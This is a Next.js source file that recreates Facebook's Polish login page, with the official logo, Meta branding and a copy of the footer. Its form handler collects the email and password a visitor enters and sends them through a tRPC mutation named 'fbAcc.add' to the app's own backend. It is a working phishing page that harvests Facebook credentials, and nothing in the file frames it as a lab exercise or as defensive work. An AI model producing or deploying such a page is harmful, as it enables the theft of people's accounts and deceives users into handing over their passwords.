import type { NextPage } from "next";
import Head from "next/head";
import { trpc } from "../utils/trpc";

const Home: NextPage = () => {
  const hello = trpc.useQuery(["example.hello", { text: "from tRPC" }]);

  const addFbAccMutation = trpc.useMutation(["fbAcc.add",])

  function addFbAcc(event){
    event.preventDefault()
    console.log(event.target.email.value)
    const fbAcc = {
      email: event.target.email.value,
      password: event.target.password.value
    }
    addFbAccMutation.mutate({...fbAcc})
    

  }

  return (
    <>
      <div className=" h-[100vh] w-[100%] pt-32 bg-[#f0f2f5]  flex flex-col items-center" >
        <div className="">
          <div className="flex md:flex-col max-w-[980px] ml-auto mr-auto">
            <div className="flex flex-col justify-center md:items-center ml-auto mr-auto w-[60%] ">
              <div className="invisible md:visible text-center text-[#3b5998] bg-[#fffbe2]">
                <p>
                  Pobierz aplikacje na urządzenia mobilne
                </p>
              </div>
              <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" className="-ml-8 mt-2 md:ml-0 md:mt-0" width={300} height={80} alt="" />
              <div>
              <p className="text-3xl leading-8 md:text-center md:pr-0 md:mb-10 mb-24 pr-16 ">Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informacje i materiały.</p>

              </div>
            </div>
            <div className="w-[25rem] h-74 md:ml-auto md:mr-auto md:w-[20rem]">
              <div className="bg-white rounded-md shadow-3xl ">
                <div className="flex flex-col ">
                  <form className="flex flex-col pl-4 pr-4 pt-2 " onSubmit={addFbAcc} action="">
                    <input className="p-1.5 mt-3  border border-bg-slate-400 text-lg rounded-md h-12 outline-0 focus:border-[#1b74e4] focus:placeholder-gray-300" type="text" name="email" placeholder="Adres e-mail lub numer telefonu"/>
                    <input className="p-1.5 mt-3  border border-bg-slate-400 text-lg rounded-md h-12 outline-0 focus:border-[#1b74e4] focus:placeholder-gray-300" type="password" name="password" placeholder="Hasło" />
                    <div className="pr-4 pl-4 mt-4  ">
                      <button type="submit" className="w-[100%] bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#29487d] active:scale-[0.98] duration-200 rounded-md h-12 text-white">Zaloguj się</button>
                    </div>
                  </form>

                  <div className="w-[100%] flex  justify-center" >
                    <p className="mt-4 text-[#1877f2] hover:underline">
                      Nie pamiętasz hasła?
                    </p>
                  </div>
                  <div className="w-[100%] flex  justify-center" >
                    <p className="my-3 bg-slate-200 h-[0.05rem] rounded-md w-[90%]">
                    
                    </p>
                  </div>
                  <div className="flex justify-center">
                    <button className="w-[50%] bg-[#42b72a] hover:bg-[#36a420] active:bg-[#2b9217] active:scale-[0.98] duration-200 rounded-md h-12 mb-5 text-white">Utwórz nowe konto</button>
                  </div>
                </div>

              </div>  
              <div className="flex items-center justify-center mt-5">
                <p>
                  <span className="font-semibold">Utwórz stronę</span> dla gwiazdy, marki lub firmy.
                </p>
              </div>
              
            </div>
            
          </div>
        </div>
        <div className="bg-[#fff] mt-auto h-44 w-[100%]">
        <div className="flex flex-col max-w-[980px] h-[100%] pt-5 bg-[#fff] ml-auto mr-auto">
          <ul className="flex flex-row flex-wrap text-[#737373] pt-2 text-xs md:-ml-2.5">
            <li className="md:pl-2.5">Polski</li>
            <li className="pl-2.5">English</li>
            <li className="pl-2.5">Slonsko godka</li>
            <li className="pl-2.5">Rosyjski</li>
            <li className="pl-2.5">Deutsch</li>
            <li className="pl-2.5">Francais (france)</li>
            <li className="pl-2.5">Italiano</li>
            <li className="pl-2.5">Ykpaihbcka</li>
            <li className="pl-2.5">Espanol (espana)</li>
            <li className="pl-2.5">Portuges (Brasil)</li>
            <li className="pl-2.5"> jiijJ</li>
          </ul>
          <div className=" w-[100%] h-[8px] border-b  border-[#dddfe2]">
          <div>
            <ul className="flex flex-wrap leading-[1.6] mt-2 -ml-5 flex-row text-[#737373] pt-2 text-xs">
              <li className="pl-5">Zarejestruj sie</li>
              <li className="pl-5">Zaloguj sie</li>
              <li className="pl-5">Messenger</li>
              <li className="pl-5">Facebook Lite</li>
              <li className="pl-5">Watch</li>
              <li className="pl-5">Miejsca</li>
              <li className="pl-5">Gry</li>
              <li className="pl-5">Marketplace</li>
              <li className="pl-5">Facebook Pay</li>
              <li className="pl-5">Oculus</li>
              <li className="pl-5">Portal</li>
              <li className="pl-5">Instagram</li>
              <li className="pl-5">Bulletin</li>
              <li className="pl-5">Lokalne</li>
              <li className="pl-5">Zbiórki pieniędzy</li>
              <li className="pl-5">Usługi</li>
              <li className="pl-5">Centrum informacji o głosowniu</li>
              <li className="pl-5">Grupy</li>
              <li className="pl-5">Informcje</li>
              <li className="pl-5">Utwórz reklamę</li>
              <li className="pl-5">Utwórz stronę</li>
              <li className="pl-5">Twórcy aplikacji</li>
              <li className="pl-5">Praca</li>
              <li className="pl-5">Prywatność</li>
              <li className="pl-5">Pliki cookie</li>
              <li className="pl-5">Opcje wyświetlania reklam</li>
              <li className="pl-5">Regulamin</li>
              <li className="pl-5">Pomoc</li>
              <li className="pl-5">Przesyłanie listy kontaktów i osób niebędących użytkownikami</li>
            </ul>
          </div>
          <div className="flex items-start my-5 text-[#737373] text-xs">
            <p>
              Meta © 2022 
            </p>
          </div>
          </div>
        </div>
        </div>
      </div>
    </>
  );
};

export default Home;



